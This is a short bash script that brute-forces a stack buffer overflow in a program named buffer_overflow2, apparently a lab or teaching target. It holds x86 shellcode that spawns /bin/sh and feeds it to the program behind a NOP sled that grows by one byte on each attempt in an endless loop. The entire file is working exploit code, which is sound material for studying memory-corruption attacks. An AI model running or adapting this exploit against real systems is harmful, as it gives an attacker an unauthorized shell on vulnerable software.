#!/bin/bash

SHELL_CODE="\xeb\x1d\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"

PREFIX="\x90"

i="0"
while true; do
	i=$[$i+1]
	echo "attempt " $i
	EXEC_LINE="./buffer_overflow2 `printf ${PREFIX}${SHELL_CODE}`"
	${EXEC_LINE}
	PREFIX=${PREFIX}"\x90"
done

